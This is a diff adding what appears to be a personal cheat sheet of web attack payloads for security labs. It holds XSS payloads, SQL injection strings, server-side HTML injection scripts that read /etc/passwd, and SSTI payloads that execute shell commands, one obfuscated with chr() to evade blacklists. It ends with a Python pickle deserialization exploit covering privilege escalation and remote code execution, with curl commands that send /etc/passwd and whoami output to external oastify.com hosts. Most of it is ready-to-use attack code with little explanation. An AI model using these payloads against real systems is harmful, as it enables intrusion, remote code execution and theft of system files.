@@ -1,0 +1,99 @@
+commands for the websockets 
+
+XSS 
+<img src=invalid onerror=alert(document.domain)>
+<img src=x onerror=alert(btoa(JSON.stringify(localStorage)))>
+<img src=1 onerror='alert(1)'>
+<img src=x onerror='alert('1')'>
+
+
+SQL 
+' UNION SELECT username, NULL, NULL, NULL FROM USERS -- 
+' OR 1=1 -- 
+' ORDER BY 4 -- 
+
+command for Server side HTML injection 
+
+<script>x = new XMLHttpRequest();x.onload = function(){document.write(this.responseText)};x.open("GET", "file:///etc/passwd");x.send();</script>
+ 
+
+<script>function addNewlines(str){var result='';while(str.length>0){result+=str.substring(0,100)+'\n';str=str.substring(100);}return result;}x=new XMLHttpRequest();x.onload=function(){document.write(addNewlines(btoa(this.responseText)))};x.open("GET","file:///etc/passwd");x.send();</script>
+
+
+SSTI 
+
+Lab 1 :- 
+
+Template - Tornado 
+{{ 7*7 }}
+{{ 'yash' }}
+{% import os %}{{ os.popen("whoami").read() }}
+
+Lab 2 :- 
+
+{{self.__init__.__globals__.__builtins__.__import__('os').popen(self.__init__.__globals__.__builtins__.chr(119)%2bself.__init__.__globals__.__builtins__.chr(104)%2bself.__init__.__globals__.__builtins__.chr(111)%2bself.__init__.__globals__.__builtins__.chr(97)%2bself.__init__.__globals__.__builtins__.chr(109)%2bself.__init__.__globals__.__builtins__.chr(105)).read()}}
+
+
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()}}    *****only if the command is not blacklisted*****
+
+
+Insecure deserialization 
+
+Lab 1:- 
+Part 1 - Privilege escalation 
+
+import base64
+import pickle
+decoded_data = base64.b64decode("gASVZAAAAAAAAACMCF9fbWFpbl9flIwMVXNlclNldHRpbmdzlJOUKYGUfZQojARyb2xllIwEdXNlcpSMBXRoZW1llIwFbGlnaHSUjAhsYW5ndWFnZZSMAmVulIwNbm90aWZpY2F0aW9uc5SIdWIu")
+print (decoded_data)
+b'\x80\x04\x95d\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x0cUserSettings\x94\x93\x94)\x81\x94}\x94(\x8c\x04role\x94\x8c\x04user\x94\x8c\x05theme\x94\x8c\x05light\x94\x8c\x08language\x94\x8c\x02en\x94\x8c\rnotifications\x94\x88ub.'
+class UserSettings:
+    def __init__(self, role='user', theme='light', language='en', notifications=True):
+        self.role = role
+        self.theme = theme
+        self.language = language
+        self.notifications = notifications
+
+        
+settings_obj = pickle.loads(decoded_data)
+print(settings_obj)
+<__main__.UserSettings object at 0x00000223B98C6B90>
+print(type(settings_obj).__name__, settings_obj.__dict__)
+UserSettings {'role': 'user', 'theme': 'light', 'language': 'en', 'notifications': True}
+current_settings = UserSettings(
+            role='admin',
+            theme='light',
+            language='en',
+            notifications=True
+        )
+serialized = pickle.dumps(current_settings, protocol=4)
+
+current_settings_serialized = base64.b64encode(serialized).decode('utf-8')
+print(current_settings_serialized)
+gASVZQAAAAAAAACMCF9fbWFpbl9flIwMVXNlclNldHRpbmdzlJOUKYGUfZQojARyb2xllIwFYWRtaW6UjAV0aGVtZZSMBWxpZ2h0lIwIbGFuZ3VhZ2WUjAJlbpSMDW5vdGlmaWNhdGlvbnOUiHViLg==
+
+Part 2 - RCE 
+
+1. Check for the Interaction in the burp 
+import pickle
+import base64
+import os
+ 
+class shell:
+    def __reduce__(self):
+        return os.system, ("curl qhb4mch542l9da408z4mi6t4mvsmge43.oastify.com",)
+ 
+r = shell()
+p = pickle.dumps(r,protocol=4)
+b = base64.b64encode(p)
+print(b.decode())
+
+
+2. To read the files or command execution 
+curl https://5pvpqatjb8ynm0oz5d87uv2qxh38ryfn.oastify.com/$(base64 -w 0 /etc/passwd)
+("curl 0311exb3k08l3ssppr1iofvp6gc70yon.oastify.com/$(whoami)",)
+
+
+OPTIONAL FOR THE HTML INJECTION 
+<img src="http://[your-collab-link]/test">
+<iframe src="file:///etc/passwd" width="500" height="500"></iframe>
